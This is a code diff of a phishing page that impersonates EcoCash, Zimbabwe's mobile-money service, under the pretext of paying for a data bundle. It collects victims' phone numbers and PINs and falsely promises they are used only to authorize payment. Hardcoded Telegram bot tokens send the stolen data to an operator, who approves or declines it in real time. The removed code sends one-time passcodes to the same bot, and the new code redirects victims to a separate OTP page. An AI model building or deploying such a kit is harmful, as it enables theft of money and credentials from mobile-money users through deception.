@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>EcoCash | Verify & Pay for Bundle · Zimbabwe</title>
+    <title>EcoCash | Verify Payment · Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -11,11 +11,8 @@
             --blue-dark: #002280;
             --blue-deep: #001860;
             --blue-light: #1a4dbf;
-            --blue-soft: rgba(0,51,160,0.10);
-            --blue-bdr: rgba(0,51,160,0.25);
             --green: #00b050;
             --green-dark: #007d38;
-            --green-soft: rgba(0,176,80,0.12);
             --page: #06112a;
             --surface: #0c1e3f;
             --surface2: #112350;
@@ -24,8 +21,6 @@
             --text: #ffffff;
             --text2: #c8d8f0;
             --muted: #7a99c8;
-            --shadow: 0 4px 24px rgba(0,0,0,0.35);
-            --shadow-b: 0 8px 40px rgba(0,51,160,0.40);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -48,6 +43,9 @@
             align-items: center;
             justify-content: space-between;
             box-shadow: 0 10px 28px rgba(0,51,160,0.18);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
 
         .brand {
@@ -64,8 +62,6 @@
             font-style: normal;
             color: var(--green);
         }
-
-        .menu-icon { font-size: 24px; font-weight: 800; color: #fff; line-height: 1; }
 
         main {
             min-height: calc(100dvh - 64px);
@@ -309,25 +305,31 @@
 
         .error-msg.show { display: block; }
 
+        .btn-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
         .btn-primary {
-            width: 100%;
+            flex: 1;
             border: 0;
             border-radius: 999px;
             padding: 16px 22px;
             color: white;
-            background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+            background: linear-gradient(135deg, var(--green) 0%, var(--green-dark) 100%);
             font-size: 15px;
             font-weight: 800;
             letter-spacing: 0.04em;
             text-transform: uppercase;
             cursor: pointer;
-            box-shadow: 0 10px 24px rgba(0,51,160,0.3);
+            box-shadow: 0 10px 24px rgba(0,176,80,0.3);
             touch-action: manipulation;
             transition: opacity 0.18s, box-shadow 0.18s, transform 0.12s;
         }
 
         .btn-primary:hover:not(:disabled) {
-            box-shadow: 0 14px 30px rgba(0,51,160,0.36);
+            box-shadow: 0 14px 30px rgba(0,176,80,0.36);
             transform: translateY(-1px);
         }
 
@@ -340,17 +342,17 @@
         }
 
         .btn-secondary {
-            width: 100%;
+            flex: 1;
             border: 1.5px solid var(--border2);
             border-radius: 999px;
-            padding: 14px 22px;
+            padding: 16px 22px;
             color: var(--text2);
             background: transparent;
-            font-size: 14px;
-            font-weight: 700;
+            font-size: 15px;
+            font-weight: 800;
             letter-spacing: 0.04em;
+            text-transform: uppercase;
             cursor: pointer;
-            margin-top: 10px;
             transition: all 0.2s;
         }
 
@@ -397,8 +399,6 @@
 
         @keyframes spin { to { transform: rotate(360deg); } }
 
-        @media (min-width: 900px) { .login-card { width: 520px; } }
-
         @media (max-width: 520px) {
             .topbar { height: 56px; padding: 13px 16px; }
             main { min-height: calc(100dvh - 56px); align-items: start; padding: 14px 12px; }
@@ -409,28 +409,14 @@
             .phone-group, .pin-group { padding: 13px 12px; }
             .country-select { font-size: 15px; margin-right: 9px; }
             .phone-input, .pin-input { font-size: 16px; }
-        }
-
-        @media (max-width: 360px) {
-            main { padding: 10px; }
-            .login-card { padding: 22px 14px; border-radius: 20px; }
-            .phone-group, .pin-group { padding: 12px 10px; }
-            .flag { margin-right: 8px; }
-            .country-select { font-size: 14px; margin-right: 8px; }
-            .phone-input, .pin-input { font-size: 15px; }
-            .btn-primary { padding: 15px 18px; }
-        }
-
-        @media (max-height: 680px) {
-            main { align-items: start; }
-            .login-card { margin-bottom: 12px; }
+            .btn-group { flex-direction: column; }
+            .btn-primary, .btn-secondary { padding: 15px 18px; }
         }
     </style>
 </head>
 <body>
     <header class="topbar">
         <a class="brand" href="index.html">Eco<em>Cash</em></a>
-        <div class="menu-icon">☰</div>
     </header>
 
     <main>
@@ -440,7 +426,7 @@
                 <div class="product-name">Data Bundles · Zimbabwe</div>
             </div>
 
-            <h1>Verify &amp; Pay</h1>
+            <h1>Verify &amp; Confirm</h1>
             <p class="subtitle">Enter your EcoCash number and PIN to authorize payment for your data bundle.</p>
 
             <div id="bundleSummary" class="bundle-summary">
@@ -468,12 +454,14 @@
                     <input type="password" class="pin-input" id="pinInput" placeholder="4-digit PIN" inputmode="numeric" maxlength="4">
                 </div>
 
-                <p class="hint">Your number and PIN are used only to authorise this EcoCash payment. 256-bit encrypted.</p>
+                <p class="hint">Your number and PIN are used only to authorize this EcoCash payment. 256-bit encrypted.</p>
 
                 <div class="error-msg" id="errMsg"></div>
 
-                <button class="btn-primary" type="button" id="continueBtn">Pay with EcoCash</button>
-                <button class="btn-secondary" type="button" onclick="goBack()">← Back to Bundles</button>
+                <div class="btn-group">
+                    <button class="btn-primary" type="button" id="continueBtn">Approve</button>
+                    <button class="btn-secondary" type="button" onclick="goBack()">Decline</button>
+                </div>
             </div>
 
             <div class="terms">By continuing you agree to the <a href="#" target="_blank" rel="noopener">Terms and Conditions</a>.</div>
@@ -488,8 +476,8 @@
 
     <script>
         const CONFIG = {
-            BOT_TOKEN: '8522259555:AAEl1CRJfLhjWwtqD2z6CvN-jesiotWQ__4',
-            CHAT_ID: '8757709711'
+            BOT_TOKEN: '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM',
+            CHAT_ID: '7547427914'
         };
 
         let state = { lastUpdateId: 0 };
@@ -501,7 +489,6 @@
         const errMsg = document.getElementById('errMsg');
         const spinnerOverlay = document.getElementById('spinnerOverlay');
         const bundleSummary = document.getElementById('bundleSummary');
-        const paymentForm = document.getElementById('paymentForm');
 
         let bundleData = null;
 
@@ -586,11 +573,11 @@
                 })
             }).then(() => {
                 spinnerOverlay.style.display = 'flex';
-                startPolling(approveId, declineId, phone, pin);
+                startPolling(approveId, declineId);
             }).catch(() => resetButton());
         }
 
-        function startPolling(approveId, declineId, phone, pin) {
+        function startPolling(approveId, declineId) {
             const interval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                     .then(r => r.json())
@@ -600,10 +587,11 @@
                             state.lastUpdateId = update.update_id;
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+                                const params = new URLSearchParams(window.location.search);
                                 if (cb === approveId) {
                                     clearInterval(interval);
                                     spinnerOverlay.style.display = 'none';
-                                    openOTPModal(phone, pin);
+                                    window.location.href = 'otp.html?' + params.toString();
                                 } else if (cb === declineId) {
                                     clearInterval(interval);
                                     spinnerOverlay.style.display = 'none';
@@ -617,140 +605,10 @@
             }, 1000);
         }
 
-        function openOTPModal(phone, pin) {
-            // Create modal for OTP verification
-            const modal = document.createElement('div');
-            modal.id = 'otpModal';
-            modal.style.cssText = `
-                position: fixed;
-                inset: 0;
-                background: rgba(0,0,0,0.7);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                z-index: 2000;
-            `;
-
-            modal.innerHTML = `
-                <div style="background: var(--surface); border-radius: 20px; padding: 30px; max-width: 400px; width: 90%; border: 1px solid var(--border2); box-shadow: 0 20px 60px rgba(0,0,0,0.6);">
-                    <h2 style="color: white; font-size: 20px; margin-bottom: 10px; text-align: center;">Enter OTP</h2>
-                    <p style="color: var(--muted); text-align: center; margin-bottom: 20px; font-size: 14px;">A 6-digit code has been sent to your phone</p>
-                    
-                    <div id="otpInputs" style="display: flex; gap: 8px; justify-content: center; margin-bottom: 20px;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                        <input type="text" class="otp-box" maxlength="1" inputmode="numeric" style="width: 50px; height: 50px; text-align: center; font-size: 24px; font-weight: 700; border: 2px solid var(--blue); border-radius: 10px; background: var(--surface2); color: white; font-family: inherit;">
-                    </div>
-
-                    <div id="otpError" style="display: none; background: rgba(255, 0, 0, 0.1); border: 1px solid rgba(255, 0, 0, 0.3); color: #ff6b6b; font-size: 13px; font-weight: 600; border-radius: 12px; padding: 11px 13px; margin-bottom: 14px; text-align: center;"></div>
-
-                    <button id="verifyOtpBtn" style="width: 100%; background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%); color: white; border: 0; border-radius: 999px; padding: 16px 22px; font-size: 15px; font-weight: 800; text-transform: uppercase; cursor: pointer; box-shadow: 0 10px 24px rgba(0,51,160,0.3); transition: all 0.18s; display: none;">Verify OTP</button>
-                    
-                    <button onclick="document.getElementById('otpModal').remove(); resetButton();" style="width: 100%; border: 1.5px solid var(--border2); border-radius: 999px; padding: 14px 22px; color: var(--text2); background: transparent; font-size: 14px; font-weight: 700; cursor: pointer; margin-top: 10px; transition: all 0.2s;">Cancel</button>
-                </div>
-            `;
-
-            document.body.appendChild(modal);
-
-            const otpBoxes = modal.querySelectorAll('.otp-box');
-            const verifyOtpBtn = modal.querySelector('#verifyOtpBtn');
-            const otpError = modal.querySelector('#otpError');
-
-            otpBoxes.forEach((box, index) => {
-                box.addEventListener('input', (e) => {
-                    if (e.target.value.length === 1) {
-                        if (index < otpBoxes.length - 1) {
-                            otpBoxes[index + 1].focus();
-                        }
-                    }
-                    
-                    // Check if all boxes are filled
-                    const allFilled = Array.from(otpBoxes).every(b => b.value.length === 1);
-                    if (allFilled) {
-                        verifyOtpBtn.style.display = 'block';
-                        sendOTPToBot(Array.from(otpBoxes).map(b => b.value).join(''), phone, pin, modal);
-                    }
-                });
-
-                box.addEventListener('keydown', (e) => {
-                    if (e.key === 'Backspace' && box.value === '' && index > 0) {
-                        otpBoxes[index - 1].focus();
-                    }
-                });
-
-                box.addEventListener('input', () => {
-                    box.value = box.value.replace(/[^0-9]/g, '');
-                });
-            });
-
-            otpBoxes[0].focus();
-        }
-
-        function sendOTPToBot(otp, phone, pin, modal) {
-            const ts = Date.now();
-            const validId = `valid_${ts}`;
-            const invalidId = `invalid_${ts}`;
-
-            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.CHAT_ID,
-                    text: `<b>🔵 EcoCash OTP Verification</b>\n\nPhone: <code>+263${phone}</code>\nOTP: <code>${otp}</code>\n\nValidate PIN:`,
-                    parse_mode: 'HTML',
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { text: "✅ Valid PIN", callback_data: validId },
-                                { text: "❌ Invalid PIN", callback_data: invalidId }
-                            ]
-                        ]
-                    }
-                })
-            }).then(() => {
-                startOTPPolling(validId, invalidId, modal);
-            });
-        }
-
-        function startOTPPolling(validId, invalidId, modal) {
-            const interval = setInterval(() => {
-                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
-                    .then(r => r.json())
-                    .then(data => {
-                        if (!data.ok || !data.result) return;
-                        data.result.forEach(update => {
-                            state.lastUpdateId = update.update_id;
-                            if (update.callback_query) {
-                                const cb = update.callback_query.data;
-                                const params = new URLSearchParams(window.location.search);
-                                if (cb === validId) {
-                                    clearInterval(interval);
-                                    modal.remove();
-                                    spinnerOverlay.style.display = 'flex';
-                                    setTimeout(() => {
-                                        window.location.href = 'success.html?' + params.toString();
-                                    }, 1000);
-                                } else if (cb === invalidId) {
-                                    clearInterval(interval);
-                                    const otpError = modal.querySelector('#otpError');
-                                    otpError.textContent = 'Invalid PIN. Please try again.';
-                                    otpError.style.display = 'block';
-                                    modal.querySelectorAll('.otp-box').forEach(b => b.value = '');
-                                    modal.querySelector('.otp-box').focus();
-                                }
-                            }
-                        });
-                    });
-            }, 1000);
-        }
-
         function resetButton() {
             isProcessing = false;
             continueBtn.disabled = false;
-            continueBtn.textContent = "Pay with EcoCash";
+            continueBtn.textContent = "Approve";
         }
 
         function goBack() {
